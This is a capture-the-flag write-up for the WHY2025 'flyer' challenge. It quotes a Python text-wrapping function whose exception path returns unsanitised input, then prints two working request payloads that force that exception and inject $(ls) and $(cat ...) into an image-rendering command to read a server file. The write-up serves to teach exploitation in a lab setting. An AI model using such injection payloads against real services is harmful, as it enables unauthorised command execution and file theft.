# flyer

## Description
```To promote the WHY2025 event we created a generator to create your own WHY2025 flyer!``` 

## Points: **200**

## Solutions: **5%** of players

## Solution
The handout was `flyer.py`.
Looking through the source, I discovered something interesting in the `cutstring` function: 
```py 
def cutstring(s):
  global charWidth
  try:
    s = s.strip()
    lengthWord = 0
    lengthLine = 0
    sLine = ''
    sWord = ''
    wordLength = 0
    countList = 0
    sPrint = ''
    for char in s:
      filterString(char)
      if char in charWidth.keys():
        lengthWord = lengthWord + (charWidth[char])
        lengthLine = lengthLine + (charWidth[char])
      else:
        lengthWord = lengthWord + 25
        lengthLine = lengthLine + 25
      if lengthLine < 800:          # This is run if lengthLine is under 800
        if char != ' ':
          sWord = (str(sWord) + str(char))
        else:
          sLine = (str(sLine) + str(sWord))
          lengthWord = 0
          sWord = char
      elif lengthWord > 800:        # This is run if lengthLine is over 800
          abort(400, f"Word {sWord} too long to fit on a line")
      else:                         # This is run if it is equal to 800. 
        sPrint = (str(sPrint) + str(((str(sLine) + str('DeL1m3T3r!')))))
        lengthLine = 0
        for i in sWord:
          if i in charWidth.keys():
            filterString(i)
            lengthWord = lengthWord + (charWidth[char]) # This uses [char] instead of [i] which might be a "mistake"
            lengthLine = lengthLine + (charWidth[char])
          else:
            lengthWord = lengthWord + 25
            lengthLine = lengthLine + 25
        sLine = ''
        sWord = (str(sWord) + str(char))
    if char != ' ':
      sLine = (str(sLine) + str(sWord))
      sPrint = (str(sPrint) + str(sLine))
    sPrintList = sPrint.split('DeL1m3T3r!')
    textHeight = len(sPrintList) * 60
    if textHeight > 780:
        abort(400, "Height too long: " + str(textHeight))
    text = '\\n'.join(sPrintList)
    if len(text) > 460:
        abort(400, "Length too long: " + str(len(text)))
    return(textHeight,text)
  except Exception as error:                            # If there are exceptions and it isnt http exceptions, then the unsanitized string is returned which enables us to inject malicious code into the command.
      if isinstance(error, HTTPException):
          abort(error.code, error.description)
      return(780, s)
```
So how can we make an exception? We can a keyError exception if `lengthLine == 800` and char is not in the charWidth dictionary. After that, we should be able to inject stuff into the command that is run.
First, I made a small script that demonstrates this: `solve.py` - first it pads the `lengthLine` to 800 and then the next char that is processed is `!` which is not in `charWidth` dict.
That means we have command injection. The only output that we can exfiltrate is the image - so why not inject run `ls` and exfiltrate it using a labal in the image? So I sent these params to the server:
`color=2&text=iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiirrll77!" -pointsize 24 label:"\n\n$(ls)`
This showed a file named `secret_flag_77238723.txt`. Then I got the flag by using this payload:
`color=2&text=iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiirrll77!" -pointsize 24 label:"\n\n$(cat secret_flag_77238723.txt)`